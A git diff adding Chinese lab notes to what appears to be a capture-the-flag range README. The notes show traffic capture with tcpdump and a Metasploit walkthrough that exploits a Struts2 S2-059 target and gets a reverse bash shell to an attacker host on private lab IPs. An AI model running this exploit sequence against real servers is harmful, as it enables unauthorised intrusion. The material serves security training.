@@ -103,11 +103,85 @@ c4pr1c3/vulshare_nginx-php-flag
 
 ![](./img/DMZ启动场景.png)
 
-### 
+### 流量捕获配置
+
+在启动了场景之后，可以通过下面的命令开启对`struts2-cve_2020_17530`的流量捕获
+```bash
+container_name="<替换为目标容器名称或ID>"
+docker run --rm --net=container:${container_name} -v ${PWD}/tcpdump/${container_name}:/tcpdump kaazing/tcpdump
+```
+
+该命令在当前路径下创建了一个`tcpdump`目录，并且将对指定容器监控的流量捕获到目录中
+
+## DMZ 入口靶标
+
+入口靶标页面如下，记录目标ip和端口号
+
+![](./img/入口靶标.png)
+ 
+进入攻击机，更新并初始化`metasploit`
+
+```bash
+sudo apt install -y metasploit-framework
+sudo msfdb init
+```
+检查数据库连接情况并创建工作区准备攻击：
+
+![](./img/检查状态与创建工作目录.png)
+
+由于已经知道了漏洞为`struts2代码执行漏洞`，所以进行相关搜索搜索：
+```bash
+search struts2 type:exploit
+search S2-059 type:exploit
+```
+使用`info`可以指定序号或名称查看详情
+```bash
+info 0
+```
+使用`use`可以使用指定的exp
+```bash
+use 0
+```
+使用`show options`可以查看exp的详细参数配置,使用`show payloads`可以查看可用 exp payloads：
+
+```bash
+show options
+show payloads
+```
+
+![](./img/查看payload.png)
+
+选择一个需要的`payload`使用并根据参数列表的内容修改靶机和攻击机的参数
+
+```bash
+set payload payload/cmd/unix/reverse_bash   #设置payload
+set RHOSTS 192.168.131.10   #靶机IP
+set rport  30947    #靶机目标端口    
+set LHOST  192.168.131.6   #攻击者主机IP 
+```
+
+检查配置的参数,发现已经得到修改：
+
+![](./img/检查参数设置.png)
+
+执行攻击，如果攻击成功，按照payload的内容可以获得靶机的shell:
+```bash
+run -j 
+```
+
+![](./img/靶口获得shell.png)
+
+使用`sessions`命令查看列表，打开`shell`执行命令
+```bash
+sessions -l
+sessions -i 2
+```
+
+![](./img/攻破靶口.png)
 
 
+得到flag
 
-
-
+## 
 
 
